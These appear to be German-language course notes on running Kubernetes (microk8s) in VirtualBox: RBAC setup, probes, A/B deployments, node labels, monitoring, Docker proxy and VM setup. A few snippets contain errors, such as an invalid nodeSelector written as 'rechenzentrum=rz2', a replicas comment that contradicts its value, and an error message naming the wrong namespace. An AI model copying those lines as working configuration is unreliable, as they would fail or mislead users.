## öffentliche ip herausfinden - z.B. enp0s8 bei HostOnly - Adapter
ip -br a 
```

### config für kubectl aus Cluster-Node auslesen (microk8s) 

```
## auf virtualbox - maschine per ssh einloggen / zum root wechseln 
## abfragen
microk8s config 

## Alle Zeilen ins clipboard kopieren
## und mit notepad++ in die Datei \Users\<dein-name>\.kube\config 
## schreiben

## Wichtig: Zeile cluster -> clusters / server 
## Hier ip von letztem Schritt eintragen:
## z.B. 
Server: https://192.168.56.106/......
```

### Testen 

```
## in powershell
## kann ich eine Verbindung zum Cluster aufbauen ? 
kubectl cluster-info 
```



  * https://kubernetes.io/docs/tasks/tools/install-kubectl-windows/

### Arbeiten mit der Registry

### Installation Kubernetes Dashboard


### Reference:

  * https://blog.tippybits.com/installing-kubernetes-in-virtualbox-3d49f666b4d6    

## Kubernetes - RBAC 

### Nutzer einrichten - kubernetes bis 1.24


### Enable RBAC in microk8s 

```
## This is important, if not enable every user on the system is allowed to do everything 
microk8s enable rbac 
```

### Schritt 1: Nutzer-Account auf Server anlegen / in Client 

```
cd 
mkdir -p manifests/rbac
cd manifests/rbac
```

####  Mini-Schritt 1: Definition für Nutzer 

```
## vi service-account.yml 
apiVersion: v1
kind: ServiceAccount
metadata:
  name: training
  namespace: default
```

```
kubectl apply -f service-account.yml 
```


#### Mini-Schritt 2: ClusterRolle festlegen - Dies gilt für alle namespaces, muss aber noch zugewiesen werden

```
### Bevor sie zugewiesen ist, funktioniert sie nicht - da sie keinem Nutzer zugewiesen ist 

## vi pods-clusterrole.yml 
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: pods-clusterrole
rules:
- apiGroups: [""] # "" indicates the core API group
  resources: ["pods"]
  verbs: ["get", "watch", "list"]
```

```
kubectl apply -f pods-clusterrole.yml 
```

#### Mini-Schritt 3: Die ClusterRolle den entsprechenden Nutzern über RoleBinding zu ordnen 
```
## vi rb-training-ns-default-pods.yml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: rolebinding-ns-default-pods
  namespace: default
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: pods-clusterrole 
subjects:
- kind: ServiceAccount
  name: training
  namespace: default
```

```
kubectl apply -f rb-training-ns-default-pods.yml
```

#### Mini-Schritt 4: Testen (klappt der Zugang) 

```
kubectl auth can-i get pods -n default --as system:serviceaccount:default:training
```

### Schritt 2: Context anlegen / Credentials auslesen und in kubeconfig hinterlegen (bis Version 1.25.) 

#### Mini-Schritt 1: kubeconfig setzen 

```
kubectl config set-context training-ctx --cluster microk8s-cluster --user training

## extract name of the token from here 

TOKEN=`kubectl get secret trainingtoken -o jsonpath='{.data.token}' | base64 --decode`
echo $TOKEN
kubectl config set-credentials training --token=$TOKEN
kubectl config use-context training-ctx

## Hier reichen die Rechte nicht aus 
kubectl get deploy
## Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:kube-system:training" cannot list # resource "pods" in API group "" in the namespace "default"
```

#### Mini-Schritt 2:
```
kubectl config use-context training-ctx
kubectl get pods 
```

### Refs:

  * https://docs.oracle.com/en-us/iaas/Content/ContEng/Tasks/contengaddingserviceaccttoken.htm
  * https://microk8s.io/docs/multi-user
  * https://faun.pub/kubernetes-rbac-use-one-role-in-multiple-namespaces-d1d08bb08286

### Ref: Create Service Account Token 

  * https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/#create-token

## kubectl 

### Tipps&Tricks zu Deploymnent - Rollout


### Warum 

```
Rückgängig machen von deploys, Deploys neu unstossen.
(Das sind die wichtigsten Fähigkeiten

```

### Beispiele 

```
## Deployment nochmal durchführen 
## z.B. nach kubectl uncordon n12.training.local 
kubectl rollout restart deploy nginx-deployment 

## Rollout rückgängig machen 
kubectl rollout undo deploy nginx-deployment 

```

## Kubernetes - Monitoring (microk8s und vanilla) 

### metrics-server aktivieren (microk8s und vanilla)


### Warum ? Was macht er ? 

```
Der Metrics-Server sammelt Informationen von den einzelnen Nodes und Pods
Er bietet mit 

kubectl top pods
kubectl top nodes 

ein einfaches Interface, um einen ersten Eindruck über die Auslastung zu bekommen. 
```

### Walktrough 

```
## Auf einem der Nodes im Cluster (HA-Cluster) 
microk8s enable metrics-server 

## Es dauert jetzt einen Moment bis dieser aktiv ist auch nach der Installation 
## Auf dem Client
kubectl top nodes 
kubectl top pods 

```

### Kubernetes 

  * https://kubernetes-sigs.github.io/metrics-server/
  * kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml

## Kubernetes - Backups 

## Kubernetes - Tipps & Tricks 

### Assigning Pods to Nodes


### Walkthrough 

```
## leave n3 as is 
kubectl label nodes n7 rechenzentrum=rz1
kubectl label nodes n17 rechenzentrum=rz2
kubectl label nodes n27 rechenzentrum=rz2

kubectl get nodes --show-labels
```

```
## nginx-deployment 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
spec:
  selector:
    matchLabels:
      app: nginx
  replicas: 9 # tells deployment to run 2 pods matching the template
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: nginx:latest
        ports:
        - containerPort: 80
      nodeSelector:
        rechenzentrum: rz2

## Let's rewrite that to deployment 
apiVersion: v1
kind: Pod
metadata:
  name: nginx
  labels:
    env: test
spec:
  containers:
  - name: nginx
    image: nginx
    imagePullPolicy: IfNotPresent
  nodeSelector:
    rechenzentrum=rz2



```

### Ref:

  * https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

## Kubernetes - Documentation 

### LDAP-Anbindung

  * https://github.com/apprenda-kismatic/kubernetes-ldap

### Helpful to learn - Kubernetes

  * https://kubernetes.io/docs/tasks/

### Environment to learn

  * https://killercoda.com/killer-shell-cks

### Environment to learn II

  * https://killercoda.com/

### Youtube Channel

  * https://www.youtube.com/watch?v=01qcYSck1c4

## Kubernetes -Wann / Wann nicht 

### Kubernetes Wann / Wann nicht


### Frage: Kubernetes: Sollen wir das machen und was kost' mich das ? 

#### Rechtliche Regulatorien 

#### Nationale Grenzen 

#### Cloud oder onPrem (private Cloud)

#### Gegenfragen:

```
1. Monolithisches System (SAP Rx) <-> oder stark modulares System (Web-Applikation mit microservices)
    
   Kubernetes : weniger sinnvoll  <-> sehr sinnvoll.
   
   
```

#### Kosten: 

```
  o Konzeption / Planung 
  o Cluster / Manpower (Cluster-Kompetenz) 
  o Neue Backup-Strategie / Software 
  o Monitoring (ELK / EFK - STack (Elastich Search / Logstash-Fluent)) 
```

#### Anforderungen an Last 

  * Statisch (immer gleich) 
  * Dynamisch (stark wechselnd) - Einsparpotential durch Features Cloudanbieter (nur so viel bezahlen wie ich nutze) 

#### Nutzt mir Skailierung und kann ich skalieren

  * Gibt meine Applikation 
  * Habe durch mehr Webservice der gleichen Typs eine bessere Performance 

#### Kubernetes -> Kategorien. Warum ? 

  * Kosten durch Umstellung auf Cloud senken ? 
  * Automatisches Skalieren meiner Software bei Hochlast / Bedarf (verbunden mit dynamische Kosten) 
  * Erleichtertes Handling Updates (schnelleres Time-To-Market -> neuere Versioninierung) 

## Kubernetes - Hardening 

### Kubernetes Tipps Hardening


### PSA (Pod Security Admission) 

```
Policies defined by namespace.
e.g. not allowed to run container as root.

Will complain/deny when creating such a pod with that container type

```

### Möglichkeiten in Pods und Containern 

```
## für die Pods
kubectl explain pod.spec.securityContext 
kubectl explain pod.spec.containers.securityContext
```

### Example (seccomp / security context) 

```
A. seccomp - profile
https://github.com/docker/docker/blob/master/profiles/seccomp/default.json

```

```
apiVersion: v1
kind: Pod
metadata:
  name: audit-pod
  labels:
    app: audit-pod
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/audit.json

  containers:

  - name: test-container
    image: hashicorp/http-echo:0.2.3
    args:
    - "-text=just made some syscalls!"
    securityContext:
      allowPrivilegeEscalation: false

```

### SecurityContext (auf Pod Ebene) 

```
kubectl explain pod.spec.containers.securityContext 

```


### NetworkPolicy 

```
## Firewall Kubernetes 
```

## Kubernetes Deployment Scenarios 

### Deployment green/blue,canary,rolling update


### Canary Deployment 

```
A small group of the user base will see the new application 
(e.g. 1000 out of 100.000), all the others will still see the old version

From: a canary was used to test if the air was good in the mine 
(like a test balloon) 
```

### Blue / Green Deployment 

```
The current version is the Blue one 
The new version is the Green one 

New Version (GREEN) will be tested and if it works  
the traffic will be switch completey to the new version (GREEN) 

Old version can either be deleted or will function as fallback 
```

### A/B Deployment/Testing 

```
2 Different versions are online, e.g. to test a new design / new feature 
You can configure the weight (how much traffic to one or the other) 
by the number of pods
```

#### Example Calculation 

```
e.g. Deployment1: 10 pods
Deployment2: 5 pods

Both have a common label,
The service will access them through this label 
```

### Praxis-Übung A/B Deployment


### Walkthrough 

```
cd
cd manifests
mkdir ab 
cd ab 
```

```
## vi 01-cm-version1.yml 
apiVersion: v1
kind: ConfigMap
metadata:
  name: nginx-version-1
data:
  index.html: |
    <html>
    <h1>Welcome to Version 1</h1>
    </br>
    <h1>Hi! This is a configmap Index file Version 1 </h1>
    </html>
```

```
## vi 02-deployment-v1.yml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deploy-v1
spec:
  selector:
    matchLabels:
      version: v1
  replicas: 2
  template:
    metadata:
      labels:
        app: nginx
        version: v1
    spec:
      containers:
      - name: nginx
        image: nginx:latest
        ports:
        - containerPort: 80
        volumeMounts:
            - name: nginx-index-file
              mountPath: /usr/share/nginx/html/
      volumes:
      - name: nginx-index-file
        configMap:
          name: nginx-version-1
```

```
## vi 03-cm-version2.yml 
apiVersion: v1
kind: ConfigMap
metadata:
  name: nginx-version-2
data:
  index.html: |
    <html>
    <h1>Welcome to Version 2</h1>
    </br>
    <h1>Hi! This is a configmap Index file Version 2 </h1>
    </html>
```

```
## vi 04-deployment-v2.yml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deploy-v2
spec:
  selector:
    matchLabels:
      version: v2
  replicas: 2
  template:
    metadata:
      labels:
        app: nginx
        version: v2
    spec:
      containers:
      - name: nginx
        image: nginx:latest
        ports:
        - containerPort: 80
        volumeMounts:
            - name: nginx-index-file
              mountPath: /usr/share/nginx/html/
      volumes:
      - name: nginx-index-file
        configMap:
          name: nginx-version-2
```

```
## vi 05-svc.yml 
apiVersion: v1
kind: Service
metadata:
  name: my-nginx
  labels:
    svc: nginx
spec:
  type: NodePort
  ports:
  - port: 80
    protocol: TCP
  selector:
    app: nginx
```

```
kubectl apply -f . 
## get external ip  
kubectl get nodes -o wide 
## get port
kubectl get svc my-nginx -o wide 
## test it with curl apply it multiple time (at least ten times)
curl <external-ip>:<node-port>
```

## Kubernetes Probes (Liveness and Readiness) 

### Übung Liveness-Probe



### Übung 1: Liveness (command) 

```
What does it do ? 
 
* At the beginning pod is ready (first 30 seconds)
* Check will be done after 5 seconds of pod being startet
* Check will be done periodically every 5 minutes and will check
  * for /tmp/healthy
  * if file is there will return: 0 
  * if file is not there will return: 1 
* After 30 seconds container will be killed
* After 35 seconds container will be restarted
```

```
## cd
## mkdir -p manifests/probes
## cd manifests/probes 
## vi 01-pod-liveness-command.yml 

apiVersion: v1
kind: Pod
metadata:
  labels:
    test: liveness
  name: liveness-exec
spec:
  containers:
  - name: liveness
    image: busybox
    args:
    - /bin/sh
    - -c
    - touch /tmp/healthy; sleep 30; rm -f /tmp/healthy; sleep 600
    livenessProbe:
      exec:
        command:
        - cat
        - /tmp/healthy
      initialDelaySeconds: 5
      periodSeconds: 5
```

```
## apply and test 
kubectl apply -f 01-pod-liveness-command.yml 
kubectl describe -l test=liveness pods 
sleep 30
kubectl describe -l test=liveness pods 
sleep 5 
kubectl describe -l test=liveness pods 
```

```
## cleanup
kubectl delete -f 01-pod-liveness-command.yml
 
``` 

### Übung 2: Liveness Probe (HTTP)

```
## Step 0: Understanding Prerequisite:
This is how this image works:
## after 10 seconds it returns code 500 
http.HandleFunc("/healthz", func(w http.ResponseWriter, r *http.Request) {
    duration := time.Now().Sub(started)
    if duration.Seconds() > 10 {
        w.WriteHeader(500)
        w.Write([]byte(fmt.Sprintf("error: %v", duration.Seconds())))
    } else {
        w.WriteHeader(200)
        w.Write([]byte("ok"))
    }
})
```

```
## Step 1: Pod  - manifest 
## vi 02-pod-liveness-http.yml
## status-code >=200 and < 400 o.k. 
## else failure 
apiVersion: v1
kind: Pod
metadata:
  labels:
    test: liveness
  name: liveness-http
spec:
  containers:
  - name: liveness
    image: k8s.gcr.io/liveness
    args:
    - /server
    livenessProbe:
      httpGet:
        path: /healthz
        port: 8080
        httpHeaders:
        - name: Custom-Header
          value: Awesome
      initialDelaySeconds: 3
      periodSeconds: 3
```

```
## Step 2: apply and test
kubectl apply -f 02-pod-liveness-http.yml
## after 10 seconds port should have been started 
sleep 10 
kubectl describe pod liveness-http

```


### Reference:
 
   * https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/

### Funktionsweise Readiness-Probe vs. Liveness-Probe


### Why / Howto / 

  * Readiness checks, if container is ready and if it's not READY 
    * SENDS NO TRAFFIC to the container   
  

### Difference to LiveNess 

  * They are configured exactly the same, but use another keyword
    * readinessProbe instead of livenessProbe 

### Example 

```
readinessProbe:
  exec:
    command:
    - cat
    - /tmp/healthy
  initialDelaySeconds: 5
  periodSeconds: 5
```

### Reference 

  * https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/#define-readiness-probes

## Linux und Docker Tipps & Tricks allgemein 

### Auf ubuntu root-benutzer werden


```
## kurs> 
sudo su -
## password von kurs eingegeben
## wenn wir vorher der benutzer kurs waren
```

### IP - Adresse abfragen


```
## IP-Adresse abfragen
ip a
```

### Hostname setzen


```
## als root 
hostnamectl set-hostname server.training.local 
## damit ist auch sichtbar im prompt 
su - 
```

### Proxy für Docker setzen


### Walktrough

```
## as root
systemctl list-units -t service | grep docker
systemctl cat snap.docker.dockerd.service
systemctl edit snap.docker.dockerd.service
## in edit folgendes reinschreiben
[Service]
Environment="HTTP_PROXY=http://user01:password@10.10.10.10:8080/"
Environment="HTTPS_PROXY=https://user01:password@10.10.10.10:8080/"
Environment="NO_PROXY= hostname.example.com,172.10.10.10"

systemctl show snap.docker.dockerd.service --property Environment
systemctl restart snap.docker.dockerd.service
systemctl cat snap.docker.dockerd.service
cd /etc/systemd/system/snap.docker.dockerd.service.d/
ls -la
cat override.conf
```

### Ref

  * https://www.thegeekdiary.com/how-to-configure-docker-to-use-proxy/

### vim einrückung für yaml-dateien


### Ubuntu (im Unterverzeichnis /etc/vim/vimrc.local - systemweit) 

```
hi CursorColumn cterm=NONE ctermbg=lightred ctermfg=white
autocmd FileType y?ml setlocal ts=2 sts=2 sw=2 ai number expandtab cursorline cursorcolumn
```

### Testen 

```
vim test.yml 
Eigenschaft: <return> # springt eingerückt in die nächste Zeile um 2 spaces eingerückt

## evtl funktioniert vi test.yml auf manchen Systemen nicht, weil kein vim (vi improved) 


```

### YAML Linter Online

  * http://www.yamllint.com/

### Läuft der ssh-server


```
systemctl status sshd 
systemctl status ssh
```

### Basis/Parent - Image erstellen


### Auf Basis von debootstrap 

```
## Auf einem Debian oder Ubuntu - System 
## folgende Schritte ausführen 
## z.B. virtualbox -> Ubuntu 20.04. 

### alles mit root durchführen
apt install debootstrap
cd
debootstrap focal focal > /dev/null
tar -C focal -c . | docker import - focal 

## er gibt eine checksumme des images 
## so kann ich das sehen
## müsste focal:latest heissen
docker images

## teilchen starten 
docker run --name my_focal2 -dit focal:latest bash 

## Dann kann ich danach reinwechseln 
docker exec -it my_focal2 bash 
```

### Virtuelle Maschine Windows/OSX mit Vagrant erstellen

```
## Installieren.
https://vagrantup.com 
## ins terminal 
cd 
cd Documents 
mkdir ubuntu_20_04_test 
cd ubuntu_20_04_test
vagrant init ubuntu/focal64
vagrant up 
## Wenn die Maschine oben ist, kann direkt reinwechseln
vagrant ssh 
## in der Maschine kein pass notwendig zum Wechseln 
sudo su -

## wenn ich raus will
exit
exit

## Danach kann ich die maschine wieder zerstören
vagrant destroy -f 
```


### Ref:

  * https://docs.docker.com/develop/develop-images/baseimages/

### Eigenes unsichere Registry-Verwenden. ohne https


### Setup insecure registry (snap)

```

systemctl restart 

```

### Spiegel - Server (mirror -> registry-mirror) 

```
https://docs.docker.com/registry/recipes/mirror/

```

### Ref:

  * https://docs.docker.com/registry/insecure/

## VirtualBox Tipps & Tricks 

### VirtualBox 6.1. - Ubuntu für Kubernetes aufsetzen 


### Vorbereitung 

  * Ubuntu Server 22.04 LTS - ISO herunterladen

### Schritt 1: Virtuelle Maschine erstellen 

```
In VirtualBox Manager -> Menu -> Maschine -> Neu (Oder Neu icon) 

Seite 1:
Bei Name Ubuntu Server eingeben (dadurch wird gleich das richtige ausgewählt, bei den Selects) 
Alles andere so lassen.
Weiter 

Seite 2: 
Hauptspeicher mindest 4 GB , d.h. 4096 auswählen (füpr Kubernetes / microk8s)
Weiter

Seite 3:
Festplatte erzeugen ausgewählt lassen
Weiter

Seite 4: 
Dateityp der Festplatte: VDI ausgewählt lassen
Weiter 

Seite 5:
Art der Speicherung -> dynamisch alloziert ausgewählt lassen
Weiter 

Seite 6:
Dateiname und Größe -> bei Größe mindestens 30 GB einstellen (bei Bedarf größer) 
-> Erzeugen 
```

### Schritt 2: ISO einhängen / Netzwerk und starten / installieren

```
Neuen Server anklicken und ändern klicken:

1. 
Massenspeicher -> Controller IDE -> CD (Leer) klicken
CD - Symbol rechts neben -> Optisches Laufwerk (sekundärer Master) -> klicken -> Abbild auswählen
Downgeloadetes ISO Ubuntu 22.04 auswählen -> Öffnen klicken 

2. 
Netzwerk -> Adapter 2 (Reiter) anklicken -> Netzwerkadapter aktivieren
Angeschlossen an -> Host-only - Adapter 

3. 
unten rechts -> ok klicken 

```

### Schritt 3: Starten klicken und damit Installationsprozess beginnen

```
Try or install Ubuntu Server -> ausgewählt lassen

Seite 1:
Use up -.... Select your language 
-> English lassen
Enter eingeben

Seite 2: Keyboard Configuration
Layout auswählen (durch Navigieren mit Tab-Taste) -> Return
German auswählen (Pfeiltaste nach unten bis German, dann return)
Identify Keyboard -> Return
Keyboard Detection starting -> Ok 
Jetzt die gewünschten tasten drücken und Fragen beantworten
Layout - Variante bestätigen mit OK 

-> Done 

Seite 3: Choose type of install 
Ubuntu - Server ausgewählt lassen

-> Done 

Seite 4: Erkennung der Netzwerkkarten 
(192.168.56.1x) sollte auftauchen

-> Done 

Seite 5: Proxy

leer lassen

-> Done 

Seite 6: Mirror Address

kann so bleiben

-> Done 

Seite 7: 

Guided Storage konfiguration
Entire Disk 

-> Done 

Seite 8: File System Summary

-> Done 

Seite 9: Popup: Confirm destructive action 
Bestätigen, dass gesamte Festplatte überschrieben wird
(kein Problem, da Festplatte ohnehin leer und virtuell)

-> Continue 

Seite 10: Profile Setup

User eingeben / einrichten 
Servernamen einrichten 

-> Done 

Seite 11: SSH Setup 

Haken bei: Install OpenSSH Server 
setzen

-> Done 

Seite 12: Featured Server Snaps 

Hier brauchen wir nichts auswählen, alles kann später installiert werden

-> Done 

Seit 13:  Installation

Warten bis Installation Complete und dies auch unten angezeigt wird (Reboot Now):
(es dauert hier etwas bis alle Updates (unattended-upgrades) im Hintergrund durchgeführt worden sind) 

-> Reboot Now 

Wenn "Failed unmounting /cdrom" kommt 
dann einfach Server stoppen
-> Virtual Box Manager -> Virtuelle Maschine auswählen -> Rechte Maustaste -> Schliessen ->  Ausschalten 

```

### Schritt 4: Starten des Gast-Systems in virtualbox 

```
* Im VirtualBox Manager auf virtuelle Maschine klicken
* Neben dem Start - Pfeil -> Dreieck anklicken und Ohne Gui starten wählen 
* System startet dann im Hintergrund (kein 2. Fenster)
```

### Erklärung 

 * Console wird nicht benötigt, da wir mit putty (ssh) arbeiten zum Administrieren des Clusters
 * Putty-Verbindung muss nur auf sein, wenn wir administrieren
 * Verwendung des Clusters (nutzer/Entwickler) erfolgt ausschliesslich über kubectl in powershell !! 

### VirtualBox 6.1. - Shared folder aktivieren


### Prepare 

```
Walkthrough

## At the top menu of the virtual machine 
## Menu -> Geräte -> Gasterweiterung einlegen 

## In the console do a 
mount /dev/cdrom /mnt
cd /mnt
sudo apt-get install -y build-essential linux-headers-`uname -r`
sudo ./VBoxLinuxAdditions.run 


sudo reboot

```

### Configure 

```
Geräte -> Gemeinsame Ordner 
Hinzufügen (blaues Ordnersymbol mit + ) -> 
Ordner-Pfad: C:\Linux (Ordner muss auf Windows angelegt sein) 
Ordner-Name: linux
checkbox nicht ausgewählt bei : automatisch einbinden, nur lesbar
checkbox ausgewählt bei: Permanent erzeugen

Dann rebooten

In der virtuellen Maschine:  
sudo su -
mkdir /linux
## linux ist der vergebene Ordnername 
mount -t vboxsf linux /linux 

## Optional, falls du nicht zugreifen kannst:
sudo usermod -aG vboxsf root 
sudo usermod -aG vboxsf <your-user>


```


### persistent setzen (beim booten mounten) 
```
echo "linux	/linux	vboxsf	defaults	0	0" >> /etc/fstab 
reboot
```

### Reference:

  * https://gist.github.com/estorgio/1d679f962e8209f8a9232f7593683265
